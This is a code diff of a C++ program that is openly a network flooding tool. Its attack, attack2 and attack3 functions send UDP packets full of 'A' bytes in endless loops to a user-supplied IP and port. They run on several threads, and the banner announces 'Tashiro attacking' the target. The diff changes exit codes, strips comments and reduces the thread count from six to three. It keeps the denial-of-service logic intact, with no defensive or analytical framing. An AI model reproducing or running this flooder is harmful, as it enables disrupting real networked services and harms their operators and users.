@@ -23,8 +23,9 @@ const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-                    "AAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
+                    "AAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
 
+//template <class T>
 void attack(char* str)
 {
     int soc{};
@@ -50,7 +51,7 @@ void attack(char* str)
         }
         catch (...) {
             perror("Error ");
-            exit(-1);
+            exit(1);
         }
     }
 }
@@ -69,18 +70,15 @@ void attack2(char* str)
 
     while (true) {
         try {
-            //ソケット生成
             sock = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
-            //データ送信
             sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
-            //ソケットを閉じる
             (*F_close)(sock);
         }
         catch (...) {
             perror("Error ");
-            exit(-1);
+            exit(1);
         }
     }
 }
@@ -99,18 +97,15 @@ void attack3(char* str)
 
     while (true) {
         try {
-            //ソケット生成
             socks = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
-            //データ送信
             sendto(socks, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
-            //ソケットを閉じる
             (*F_close)(socks);
         }
         catch (...) {
             perror("Error ");
-            exit(-1);
+            exit(1);
         }
     }
 }
@@ -126,12 +121,12 @@ int main(int argc, char* argv[])
 
     if (argc < 3) {
         printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
-        return -1;
+        return 1;
     }
 
     if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
         perror("Error ");
-        return -1;
+        return 1;
     }
 
     port = atoi(argv[2]);
@@ -141,18 +136,12 @@ int main(int argc, char* argv[])
     printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);
 
     thread t1(attack, str);
-    thread t2(attack, str);
-    thread t3(attack2, str);
-    thread t4(attack2, str);
-    thread t5(attack3, str);
-    thread t6(attack3, str);
+    thread t2(attack2, str);
+    thread t3(attack3, str);
 
     t1.join();
     t2.join();
     t3.join();
-    t4.join();
-    t5.join();
-    t6.join();
 
     return 0;
 }
